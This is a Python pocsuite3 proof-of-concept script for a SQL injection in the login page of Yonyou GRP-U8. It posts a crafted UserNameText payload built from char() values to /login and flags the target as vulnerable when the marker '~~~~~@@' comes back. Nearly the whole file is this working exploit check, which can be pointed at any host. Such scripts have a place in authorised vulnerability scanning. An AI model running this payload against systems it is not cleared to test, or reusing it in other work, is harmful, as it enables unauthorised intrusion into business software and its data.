#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友GRP-U8_login_sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''GRP-U8'''
    appVersion = '''u8'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        verify_url = make_verify_url(self.url, "/login", mod=0)
        data = {'UserNameText': "a')) and 1=char(126)+char(126)+char(126)+char(126)+char(126)+char(64)+char(64)--",
                'UserPassText': '', 'LoginType': 'NAME', 'submitAction': 'login'}
        resp = requests.post(verify_url, data=data, verify=False, timeout=15)
        if b'~~~~~@@' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    _attack = _verify

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
